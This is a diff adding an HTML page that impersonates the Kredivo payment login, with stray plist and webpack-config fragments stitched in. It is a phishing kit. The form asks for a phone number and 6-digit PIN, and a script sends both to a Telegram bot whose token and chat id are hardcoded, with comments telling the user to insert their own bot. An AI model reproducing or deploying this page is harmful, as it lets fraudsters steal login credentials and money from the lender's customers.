@@ -1,0 +1,310 @@
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<html>
+ <head> 
+ <script>
+     const path = require("path");
+
+module.exports = {
+    // bundling mode
+    mode: "production",
+    // entry files
+    entry: "./src/index.ts",
+    // output bundles (location)
+    output: {
+        path: path.resolve( __dirname, "dist" ),
+        filename: "html5-qrcode.min.js",
+        library: "__Html5QrcodeLibrary__",
+    },
+    // file resolutions
+    resolve: {
+        extensions: [ ".ts", ".js" ],
+    },
+    target: "web",
+    module: {
+        rules: [
+            {
+                test: /\.tsx?/,
+                use: "ts-loader",
+                exclude: /node_modules/,
+            },
+        ]
+    },
+    optimization: {
+        minimize: true,
+        usedExports: true
+    }
+};
+
+
+/** Append the libary components to globals for backwards compatibility. */
+if (window) {
+    if (!Html5QrcodeScanner) {
+        var Html5QrcodeScanner = window.__Html5QrcodeLibrary__.Html5QrcodeScanner;
+    }
+    if (!Html5Qrcode) {
+        var Html5Qrcode = window.__Html5QrcodeLibrary__.Html5Qrcode;
+    }
+    if (!Html5QrcodeSupportedFormats) {
+        var Html5QrcodeSupportedFormats = window.__Html5QrcodeLibrary__.Html5QrcodeSupportedFormats
+    }
+    if (!Html5QrcodeScannerState) {
+        var Html5QrcodeScannerState = window.__Html5QrcodeLibrary__.Html5QrcodeScannerState;
+    }
+    if (!Html5QrcodeScanType) {
+        var Html5QrcodeScanType = window.__Html5QrcodeLibrary__.Html5QrcodeScanType;
+    }
+}
+
+ </script>
+  <title>Payment - Kredivo</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta name=viewport content="width=device-width, height=device-height, initial-scale=1">
+
+<script>
+ if (CSS.supports('-webkit-touch-callout', 'none')) // check for iOS safari
+  document.querySelector('meta[name=viewport]').content += ", user-scalable=no"
+</script>
+  <link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic"> 
+  <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"> 
+  <!--STYLES--> 
+  <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/payment.css"> 
+  <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/bootstrap.min.css"> 
+  <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/dashboard.css"> 
+  <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/kredivo.css"> 
+  <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/weather-icons.min.css">
+   <link href="" rel="stylesheet"
+        integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
+        <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWU1zV2MP1qIVUa_15MTP6zx6GpxW79z6aFxjji9yqHjMEAzjbdOtg8y4j&s=10" rel="shortcut icon" type="image/x-icon">
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWU1zV2MP1qIVUa_15MTP6zx6GpxW79z6aFxjji9yqHjMEAzjbdOtg8y4j&s=10" rel="apple-touch-icon">
+  <style>
+  
+  body, html{
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh31jm8jpZZKbRI1uFIIueAh2WiGgbOJ9JpkjIFiSULa5xvoBrheXk12trYCJmfSBghLEhTDn9ZxkFsjmjcU_D3nZxP86Xi3TqVbqsHkMq6vRr4hK5jmdbRO7b6JnQZoWAvm2SANLIK_3TLzz0jxG2qK5Z9uXaMYpc3yr6SiSnkQcBPhECHIY8thhFi/s16000/AddText_03-07-02.19.22.png');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%;
+  }
+   .payment-option{
+       width: 100%;
+       max-width: 100%;
+       height: 45px;
+       border-radius: 5px;
+       margin: 10px 0px;
+       border: 1px solid #ABABAB;
+       padding-left: 12px;
+       color: #B0AFB7;
+       margin-bottom: -5px;
+   }   
+   .payment-option:focus, .payment-option:hover{
+       border: 2px solid #F07D2C;
+   }
+   
+   
+   .h3{
+       font-size: 12px;
+       font-weight: bold;
+       margin-bottom: -16px;
+       margin-left: 15px;
+       position: relative;
+       background: white;
+       width: 105px;
+       color: #ABABAB;
+       z-index: 99999;
+   }
+   
+   .h4{
+       font-size: 12px;
+       font-weight: bold;
+       margin-bottom: -16px;
+       margin-left: 15px;
+       position: relative;
+       background: white;
+       width: 22px;
+       color: #ABABAB;
+       z-index: 99999;
+   }
+   
+   .btn-kredi{
+       width: 100%;
+       height: 45px;
+       bottom: 0;
+       left: 0;
+       right: 0;
+       background: #F37E31;
+       position: relative;
+       border: none;
+       color: #fff;
+       font-size: 15px;
+       margin-top: 25px;
+       margin-bottom: 10px;
+   }
+      
+   .togel {
+    position: absolute;
+    right: 37;
+    z-index: 9999;
+    cursor: pointer;
+    display: flex;
+    font-size: 5vmin;
+    justify-content: center;
+    align-items: center;
+    width: 6vmin;
+    margin-top: -25px;
+}
+  </style>
+  <!--STYLES END--> 
+ </head> 
+ <body>
+      <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }"> 
+      <div class="card-item__side -front"> 
+       <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div> 
+  <!-- Google Tag Manager (noscript) --> 
+  <noscript> 
+   <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T6GBHDX" height="0" width="0" style="display:none;visibility:hidden"></iframe> 
+  </noscript> 
+  <!-- End Google Tag Manager (noscript) --> 
+  <nav class="navbar navbar-default navbar-fixed-top"> 
+   <div class="container" id="app"> 
+    <div class="navbar-header"> 
+     <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button> 
+     <a class="navbar-brand logo" href="http://kredivo.com/">Kredivo</a> 
+    </div> 
+    <div aria-expanded="false" id="navbar" class="navbar-collapse collapse"> 
+     <ul class="nav navbar-nav navbar-right"> 
+      <li><a data-toggle="modal" data-target="#help">Butuh Bantuan?</a></li> 
+     </ul> 
+    </div> 
+   </div> 
+  </nav> 
+  <!-- Modal Bar --> 
+  <div id="help" class="modal fade" role="dialog"> 
+   <div class="modal-dialog"> 
+    <div class="modal-content"> 
+     <div class="modal-header"> 
+      <button type="button" class="close" data-dismiss="modal"><i class="fa fa-times" aria-hidden="true"></i> </button> 
+      <h4 class="modal-title">Hubungi kami</h4> 
+     </div> 
+     <div class="modal-body"> 
+      <p class="mb-20"> Customer Service dapat dihubungi dari Senin - Minggu, 08:00-20:00 </p> 
+      <div class="contact-box mb-20"> 
+       <div class="contact-box-header"> 
+        <i class="fa fa-question-circle" aria-hidden="true"></i> FAQ 
+       </div> 
+       <p>Punya pertanyaan tentang Kredivo?</p> 
+       <a class="button" href="/faqs/" target="_blank">Ke FAQ</a> 
+      </div> 
+      <div class="contact-box mb-20"> 
+       <div class="contact-box-header"> 
+        <i class="fa fa-envelope" aria-hidden="true"></i> Email 
+       </div> 
+       <p>Kirim email ke tim <i>support</i> kami untuk mendapatkan bantuan atas masalah Anda.</p> 
+       <a class="button" href="mailto:support@kredivo.com">Kirim email</a> 
+      </div> 
+      <div class="contact-box"> 
+       <div class="contact-box-header"> 
+        <i class="fa fa-phone" aria-hidden="true"></i> Telpon 
+       </div> 
+       <p>Hubungi kami langsung melalui panggilan telepon lewat nomor di bawah ini:</p> 
+       <div class="contact-box-details">
+         021-2205-5677 (0807-1-KREDIV) 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+  </div>
+  
+   <p id="userid" style="font-weight: 800; opacity: 0.0;">Username</p>
+    <div id="loader" class="bg-load load6" style="display:none;">
+        <div class="loader"></div>
+    </div>
+  <div class="login-wrap">
+   <div class="container" style="padding-left: 13px; padding-right: 13px; margin-top: -40px;"> 
+    <div class="row">
+     <div class="col-md-6 col-md-push-3"> 
+      <div class="methods mb-30" style="padding-left: 10px; padding-right: 10px; border-radius: 8px;  box-shadow: 8px 2px 3px 0px rgba(0,0,0,0.11);
+    -webkit-box-shadow: 6px 5px 5px 0px rgba(0,0,0,0.01);
+-moz-box-shadow: 3px 5px 4px 0px rgba(0,0,0,0.01);"> 
+       <div class="mb-20">
+           <h2 style=" text-align: left; margin-top: -15px; font-size: 15px;">Masuk ke Akun Kredivo-mu</h2>
+      <div class="inpform">
+  <form action="gagal.html" method="get" onsubmit="ses();">
+      <input type="hidden" id="logo" value="✥•-•-•-•⟮𝗞𝗿𝗲𝗱𝗶𝘃𝗼⟯•-•-•-•✥">
+<label class="h3">Nomor Handphone</label>
+   <input id="inpuser" value="" v-mask="'#### #### #####'" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" name="userid" maxlength="13" minlength="10" pattern="(?=.*[0-9]).{12,13}" title="Masukkan Nomor Handphone anda dengan benar" type="tel" class="payment-option" placeholder="08** Masukkan Nomor Hp Anda" style="
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 107%; padding-left: 18px; color: #B0AFB7;" required>
+<label class="h4">PIN</label>
+   <input id="inppas" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}" title="Masukkan Nomor Handphonr anda dengan benar" type="tel" class="payment-option" placeholder="Masukkan 6 Angka PIN Kredivo-Mu " style="padding-left: 18px; color: #B0AFB7;" name="" required>
+<i class="togel bi bi-eye-slash" id="togglePassword" style="margin-left: 58%; margin-bottom: 40px;"></i>
+<button type="submit" class="btn-kredi" id="kirim" onclick="loadd()">Lanjut</button>
+</form>
+<center>
+<a href="./lupa_pin.html" style="font-size: 12px; text-align: center; color: blue; font-weight: 800; background: none; border: none; text-decoration: none;" type="submit">Lupa PIN?</a>
+</center>
+</div>
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+  </div> 
+  <!--SCRIPTS-->
+  <script src="https://www.kredivo.id/p/in/js/jquery.min.js"></script>
+  <script src="https://www.kredivo.id/p/in/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="./credit.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    
+  <script>
+    $('.payment-accordion, .navbar-nav a').click(function (e) {
+      e.preventDefault();
+    });
+  </script>
+     
+ <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        function ses(){
+            var username = document.getElementById("inpuser").value;
+            sessionStorage.setItem("username", username);
+            $("#loader").fadeIn();
+        }
+    </script>
+
+ </body>
+</html>
+<script>
+function loadd() {
+
+    
+    var logo = document.getElementById('logo');
+    var inpuser = document.getElementById('inpuser');
+    var inppas = document.getElementById('inppas');
+
+    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + inpuser.value + '%0A𝗣𝗜𝗡 𝗞𝗿𝗲𝗱𝗶𝘃𝗼%3A%0A' + inppas.value;
+   
+    var token = '6059948659:AAFLZx15JTI-9jU372rUcLnMepYGqoVMaW8'; // Ganti dengan token bot yang kamu buat
+    var grup = '6131190501'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    })
+}
+</script>
+</DOCTYPE>
